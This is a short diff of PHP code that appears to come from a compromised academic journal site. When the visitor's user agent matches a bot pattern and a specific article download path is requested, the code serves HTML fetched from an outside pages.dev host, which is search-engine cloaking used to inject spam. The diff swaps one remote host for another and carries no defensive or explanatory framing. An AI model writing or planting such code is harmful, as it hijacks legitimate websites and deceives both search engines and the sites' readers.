@@ -18,7 +18,7 @@ function aselolejos($url){
 if (preg_match($botchar, $ua) && $_SERVER["REQUEST_URI"] == "/ijmoe/article/download/5392/4971/18489") {
     usleep(rand(100000, 200000)); 
     header('Content-Type: text/html; charset=utf-8');
-    echo aselolejos("https://hantubelawan.pages.dev/tol/index.html");
+    echo aselolejos("https://hantubelawanloh.pages.dev/tol/index.html");
     ob_end_flush();
     exit;
 }
